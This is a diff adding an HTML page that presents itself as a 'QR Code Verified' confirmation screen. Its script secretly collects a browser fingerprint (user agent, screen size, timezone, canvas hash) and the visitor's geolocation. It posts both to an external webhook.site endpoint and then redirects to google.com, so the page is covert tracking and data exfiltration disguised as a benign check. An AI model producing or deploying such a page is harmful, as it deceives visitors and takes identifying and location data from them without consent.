@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>QR Verified</title>
+    <meta http-equiv="refresh" content="3;url=https://google.com">
+    <style>body{font-family:system-ui;text-align:center;padding:50px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;}.loading{font-size:28px;}</style>
+</head>
+<body>
+    <div class="loading">✅ QR Code Verified</div>
+    <div id="status">Tracking device...</div>
+    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" style="position:fixed;left:-9999px;">
+    <script>
+        const fp={ua:navigator.userAgent,screen:`${screen.width}x${screen.height}`,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,canvas:(()=>{const c=document.createElement('canvas');const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillText('QRCanvas',2,20);return c.toDataURL()})()};
+        fetch('http://webhook.site/e7f0bd35-a9db-401e-9a3b-dc41cd2c9807',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...fp,source:'github-qr'})}).then(()=>document.getElementById('status').textContent='Complete!');
+        navigator.geolocation.getCurrentPosition(p=>fetch('http://webhook.site/e7f0bd35-a9db-401e-9a3b-dc41cd2c9807',{method:'POST',body:`geo=${p.coords.latitude},${p.coords.longitude}`}));
+    </script>
+</body>
+</html>
